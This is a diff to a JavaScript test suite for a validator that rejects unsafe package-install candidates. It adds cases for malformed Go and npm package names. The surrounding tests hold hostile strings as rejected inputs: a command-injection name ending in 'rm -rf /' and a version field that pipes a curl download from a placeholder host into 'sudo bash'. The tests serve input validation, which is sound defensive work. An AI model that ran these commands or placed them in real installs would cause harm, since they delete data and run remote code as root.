@@ -113,6 +113,9 @@ describe("how a candidate may be acquired", () => {
     expect(cli({ manager: "sh" })).toBe(false);
     expect(cli({ name: "-c" })).toBe(false);
     expect(cli({ name: "rg; rm -rf /" })).toBe(false);
+    expect(cli({ manager: "go", name: "github.com/x/y@main", version: "v1.2.3" })).toBe(false);
+    expect(cli({ manager: "npm", name: "@evil/x@latest", version: "1.0" })).toBe(false);
+    expect(cli({ manager: "npm", name: "@@x" })).toBe(false);
     expect(cli({ version: "curl https://x.example/i.sh | sudo bash" })).toBe(false);
     expect(cli({ version: "latest" })).toBe(false);
     expect(cli({ version: "^14" })).toBe(false);
